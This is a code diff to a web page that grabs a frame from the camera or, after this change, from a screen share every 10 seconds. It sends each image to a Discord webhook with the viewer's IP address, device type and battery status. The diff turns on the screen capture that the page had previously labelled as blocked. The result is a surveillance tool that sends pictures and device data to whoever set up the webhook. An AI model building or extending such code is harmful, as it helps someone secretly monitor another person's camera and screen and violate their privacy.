@@ -24,7 +24,8 @@
             border-radius: 0.75rem;
             box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
             object-fit: cover;
-            transform: scaleX(-1); /* Mirror the video feed for a more natural self-view */
+            /* Note: We remove the transform: scaleX(-1) for screen sharing, 
+               but keep it for the camera video feed internally using JS */
         }
         .status-box {
             min-height: 4rem;
@@ -42,7 +43,7 @@
             <p class="text-sm">This app **cannot** force logouts from external sites (like Facebook, TikTok, YouTube, or Roblox). Browser security rules (Same-Origin Policy) prevent it from accessing or deleting their login data.</p>
         </div>
 
-        <p class="text-gray-600 mb-6">Captures an image from your **Camera** every 10 seconds and sends it to the configured Discord Webhook, including **IP**, **device**, and **battery** details.</p>
+        <p class="text-gray-600 mb-6">Captures an image from your selected source (Camera or PC/Phone Screen) every 10 seconds and sends it to the configured Discord Webhook, including **IP**, **device**, and **battery** details.</p>
 
         <!-- Video Feed Container -->
         <div class="flex justify-center mb-6">
@@ -58,13 +59,11 @@
                 <input type="radio" name="source" value="camera" id="sourceCamera" class="form-radio text-indigo-600 h-4 w-4" checked>
                 <span class="ml-2">Camera</span>
             </label>
-            <label class="inline-flex items-center text-gray-400">
-                <input type="radio" name="source" value="screen" id="sourceScreen" class="form-radio text-gray-400 h-4 w-4" disabled>
+            <label class="inline-flex items-center text-gray-700">
+                <input type="radio" name="source" value="screen" id="sourceScreen" class="form-radio text-indigo-600 h-4 w-4">
                 <span class="ml-2">Screen Share (PC/Phone)</span>
-                <span class="ml-3 text-xs text-red-500 font-semibold">(Blocked by platform security policy)</span>
             </label>
         </div>
-
 
         <!-- Controls -->
         <div class="space-y-4">
@@ -88,14 +87,14 @@
         const canvas = document.getElementById('photoCanvas');
         const toggleButton = document.getElementById('toggleButton');
         const statusLog = document.getElementById('statusLog');
+        const sourceCamera = document.getElementById('sourceCamera');
+        const sourceScreen = document.getElementById('sourceScreen');
         const videoFeedElement = document.getElementById('videoFeed');
-        // Note: sourceCamera and sourceScreen elements are included in the DOM but only used for visual display.
-        // The script is hardcoded to use the camera stream (getUserMedia) as getDisplayMedia is blocked.
 
         let stream = null;
         let captureInterval = null;
         let isRunning = false;
-        let currentSource = 'camera'; // Fixed to camera
+        let currentSource = 'camera'; // Default source
 
         /**
          * Gets the public IP address using an external service.
@@ -140,7 +139,7 @@
                 screen: `${window.screen.width}x${window.screen.height}`,
                 viewport: `${window.innerWidth}x${window.innerHeight}`,
                 battery: batteryStatus,
-                source: 'Camera',
+                source: currentSource === 'camera' ? 'Camera' : 'Screen Share', // Include source in info
                 time: new Date().toLocaleString(),
             };
         };
@@ -181,7 +180,7 @@
             const discordEmbed = {
                 title: `New Automated Capture from ${deviceInfo.source}`, // Title reflects source
                 description: `Capture Time: **${deviceInfo.time}**`,
-                color: 5814783, // Blue for camera
+                color: deviceInfo.source === 'Screen Share' ? 15844367 : 5814783, // Yellow for screen, blue for camera
                 fields: [
                     { name: 'Source', value: `**${deviceInfo.source}**`, inline: true },
                     { name: 'Device Type', value: `**${deviceInfo.deviceType}**`, inline: true }, 
@@ -244,9 +243,11 @@
             // Draw the current video frame onto the canvas
             const ctx = canvas.getContext('2d');
             
-            // Apply mirror transformation for the camera feed
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
+            if (currentSource === 'camera') {
+                // Apply mirror transformation only for the camera feed
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+            }
             
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
@@ -264,25 +265,36 @@
         };
 
         /**
-         * Starts the camera capture and the auto capture interval.
+         * Starts the camera or screen capture and the auto capture interval.
          */
         const startCapture = async () => {
-            videoFeedElement.style.transform = 'scaleX(-1)'; // Ensure mirroring is on for camera
+            currentSource = document.querySelector('input[name="source"]:checked').value;
+            videoFeedElement.classList.remove('transform', 'scaleX(-1)'); // Reset visual transform first
 
             try {
-                // Use camera (getUserMedia)
-                const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                let mediaStream;
+                if (currentSource === 'camera') {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    // Re-apply mirror transform for camera feed visualization
+                    videoFeedElement.style.transform = 'scaleX(-1)';
+                    logStatus('✅ Camera access granted.', 'text-green-600 bg-green-50');
+                } else { // currentSource === 'screen'
+                    mediaStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
+                    // Screen sharing should not be mirrored
+                    videoFeedElement.style.transform = 'none';
+                    logStatus('✅ Screen sharing started.', 'text-green-600 bg-green-50');
+                }
                 
                 stream = mediaStream;
                 video.srcObject = stream;
                 
                 await new Promise(resolve => video.onloadedmetadata = resolve);
                 
-                // Add listener for stream end (in case camera is disconnected)
+                // Add listener for stream end (especially useful for screen sharing)
                 const track = stream.getVideoTracks()[0];
                 track.onended = () => {
                     if (isRunning) {
-                        logStatus('⚠️ Camera stream ended by user or system. Autoplay stopped.', 'text-yellow-700 bg-yellow-100');
+                        logStatus('⚠️ Stream ended by user or system (e.g., stopping screen share). Autoplay stopped.', 'text-yellow-700 bg-yellow-100');
                         stopCapture();
                     }
                 };
@@ -292,15 +304,18 @@
                 captureInterval = setInterval(captureAndPost, CAPTURE_INTERVAL_MS);
                 
                 isRunning = true;
+                // Disable source selection while running
+                sourceCamera.disabled = true;
+                sourceScreen.disabled = true;
 
                 toggleButton.textContent = `Stop Autoplay (Sending every ${CAPTURE_INTERVAL_MS / 1000}s)`;
                 toggleButton.classList.remove('bg-green-600', 'hover:bg-green-700', 'active:bg-green-800');
                 toggleButton.classList.add('bg-red-600', 'hover:bg-red-700', 'active:bg-red-800');
-                logStatus(`✅ Autoplay initiated from Camera.`, 'text-green-600 bg-green-50');
+                logStatus(`✅ Autoplay initiated from ${currentSource}.`, 'text-green-600 bg-green-50');
 
             } catch (err) {
                 // User denied or an error occurred
-                logStatus(`❌ Failed to start camera: ${err.name}. ${err.message}`, 'text-red-600 bg-red-50');
+                logStatus(`❌ Failed to start stream from ${currentSource}: ${err.name}. ${err.message}`, 'text-red-600 bg-red-50');
                 isRunning = false;
                 stopCapture(false); // Do not log 'stopped' status again
             }
@@ -320,6 +335,10 @@
                 stream = null;
             }
             isRunning = false;
+
+            // Re-enable source selection
+            sourceCamera.disabled = false;
+            sourceScreen.disabled = false;
 
             toggleButton.textContent = 'Start Autoplay';
             toggleButton.classList.remove('bg-red-600', 'hover:bg-red-700', 'active:bg-red-800');
